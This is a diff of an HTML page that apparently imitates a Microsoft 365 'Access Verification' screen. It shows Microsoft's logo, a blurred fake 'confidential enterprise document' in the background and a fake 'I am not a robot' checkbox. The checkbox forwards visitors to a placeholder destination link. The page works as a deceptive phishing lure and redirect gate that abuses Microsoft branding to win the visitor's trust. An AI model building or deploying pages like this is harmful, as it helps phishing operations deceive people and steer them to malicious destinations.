@@ -3,23 +3,27 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Microsoft 365 Access Verification">
   <title>Microsoft 365 – Access Verification</title>
   <style>
     :root {
       --ms-blue: #0078D4;
       --ms-light: #f3f2f1;
-      --ms-dark: #1a1a1a;
-      --ms-gray: #333;
-      --ms-light-gray: #888;
       --ms-font: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      --ms-red: #d83b01;
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+    /* Blurry document background */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"><rect width="100%" height="100%" fill="white"/><rect x="10%" y="15%" width="80%" height="70%" fill="none" stroke="%23ccc" stroke-width="1"/><line x1="15%" y1="25%" x2="85%" y2="25%" stroke="%23eee" stroke-width="1"/><line x1="15%" y1="35%" x2="85%" y2="35%" stroke="%23eee" stroke-width="1"/><line x1="15%" y1="45%" x2="85%" y2="45%" stroke="%23eee" stroke-width="1"/><line x1="15%" y1="55%" x2="85%" y2="55%" stroke="%23eee" stroke-width="1"/><text x="20%" y="23%" font-family="Arial" font-size="12" fill="%23999">CONFIDENTIAL DOCUMENT - MICROSOFT 365 ENTERPRISE</text><text x="20%" y="33%" font-family="Arial" font-size="12" fill="%23999">Document ID: MS-ENT-5XHD-8832-9921</text><text x="20%" y="43%" font-family="Arial" font-size="12" fill="%23999">Access requires identity verification</text><text x="20%" y="53%" font-family="Arial" font-size="12" fill="%23999">Security Level: PROTECTED B</text></svg>');
+      background-size: cover;
+      filter: blur(6px) brightness(0.98);
+      opacity: 0.7;
+      z-index: -1;
     }
 
     body {
@@ -29,195 +33,111 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-      line-height: 1.5;
+      height: 100vh;
+      position: relative;
     }
 
     .container {
-      background: #fff;
+      background: rgba(255, 255, 255, 0.92);
       padding: 40px 30px;
       border-radius: 8px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
-      width: 100%;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
+      width: 90%;
       max-width: 440px;
       text-align: center;
+      backdrop-filter: blur(1px);
+      border: 1px solid rgba(255,255,255,0.3);
     }
 
-    .logo {
+    .logo img {
+      height: 36px;
       margin-bottom: 25px;
-    }
-
-    .logo svg {
-      width: 120px;
-      height: auto;
     }
 
     h1 {
       font-size: 22px;
       margin-bottom: 12px;
-      color: var(--ms-dark);
-      font-weight: 600;
+      color: #1a1a1a;
     }
 
     p {
       font-size: 15px;
-      color: var(--ms-gray);
+      color: #333;
       margin-bottom: 20px;
     }
 
     .checkbox {
       margin: 20px 0;
-      text-align: center;
+      text-align: left;
       font-size: 14px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
     }
 
     .checkbox input {
       margin-right: 8px;
-      width: 16px;
-      height: 16px;
-      cursor: pointer;
-    }
-
-    .checkbox label {
-      cursor: pointer;
+      transform: scale(1.2);
     }
 
     .btn {
       background-color: var(--ms-blue);
       color: white;
       font-size: 15px;
-      font-weight: 600;
       padding: 12px 28px;
       border: none;
       border-radius: 6px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
-      width: 100%;
-      max-width: 200px;
-      margin: 10px 0;
+      transition: background-color 0.2s;
     }
 
     .btn:hover {
       background-color: #106ebe;
     }
 
-    .btn:disabled {
-      background-color: #ccc;
-      cursor: not-allowed;
-    }
-
-    .human-verify {
-      display: none;
-      margin: 20px 0;
-    }
-
-    .human-btn {
-      background-color: var(--ms-red);
-    }
-
-    .human-btn:hover {
-      background-color: #c23501;
-    }
-
     .error {
-      color: var(--ms-red);
+      color: red;
       font-size: 13px;
-      margin: 10px 0;
-      min-height: 20px;
+      margin-top: 10px;
     }
 
     .footer {
       margin-top: 30px;
       font-size: 12px;
-      color: var(--ms-light-gray);
-    }
-
-    @media (max-width: 480px) {
-      .container {
-        padding: 30px 20px;
-      }
-      
-      h1 {
-        font-size: 20px;
-      }
-      
-      .btn {
-        max-width: 100%;
-      }
+      color: #888;
     }
   </style>
+
+  <script>
+    function verifyAccess() {
+      const isChecked = document.getElementById('robotCheck').checked;
+      const error = document.getElementById('errorMessage');
+
+      if (isChecked) {
+        window.location.href = "https://www.hulu.com"; // ✅ Your destination link
+      } else {
+        error.textContent = "Please confirm you're not a robot to proceed.";
+      }
+    }
+  </script>
 </head>
 <body>
   <div class="container">
     <div class="logo">
-  <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
-       alt="Microsoft Logo" 
-       width="120">
-</div>
+      <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft 365 Logo" />
+    </div>
 
     <h1>Verify to Access</h1>
-    <p>To continue, please verify you're human.</p>
+    <p>To continue to the secure document, please confirm you're not a robot.</p>
 
     <div class="checkbox">
-      <input type="checkbox" id="robotCheck" aria-label="I am not a robot checkbox">
-      <label for="robotCheck">I am not a robot</label>
+      <label><input type="checkbox" id="robotCheck" /> I am not a robot</label>
     </div>
 
-    <div class="human-verify" id="humanVerify">
-      <button class="btn human-btn" id="humanBtn">I'm Human</button>
-    </div>
+    <button class="btn" onclick="verifyAccess()">Continue</button>
 
-    <button class="btn" id="continueBtn" disabled>Continue</button>
-
-    <div class="error" id="errorMessage" role="alert"></div>
+    <div class="error" id="errorMessage"></div>
 
     <div class="footer">
-      &copy; <span id="currentYear"></span> Microsoft Corporation. All rights reserved.
+      &copy; 2025 Microsoft Corporation. All rights reserved.
     </div>
   </div>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      // Set current year
-      document.getElementById('currentYear').textContent = new Date().getFullYear();
-      
-      const robotCheck = document.getElementById('robotCheck');
-      const humanVerify = document.getElementById('humanVerify');
-      const humanBtn = document.getElementById('humanBtn');
-      const continueBtn = document.getElementById('continueBtn');
-      const errorMessage = document.getElementById('errorMessage');
-      
-      // Show "I'm Human" button after checkbox is checked
-      robotCheck.addEventListener('change', function() {
-        if(this.checked) {
-          humanVerify.style.display = 'block';
-          errorMessage.textContent = '';
-        } else {
-          humanVerify.style.display = 'none';
-          continueBtn.disabled = true;
-        }
-      });
-      
-      // Handle "I'm Human" button click
-      humanBtn.addEventListener('click', function() {
-        continueBtn.disabled = false;
-        errorMessage.textContent = '';
-        humanVerify.style.display = 'none';
-      });
-      
-      // Handle continue button click
-      continueBtn.addEventListener('click', function() {
-        if(!this.disabled) {
-          window.location.href = "https://www.hulu.com"; // Your destination link
-        } else {
-          errorMessage.textContent = "Please complete the verification steps to proceed.";
-        }
-      });
-    });
-  </script>
 </body>
 </html>
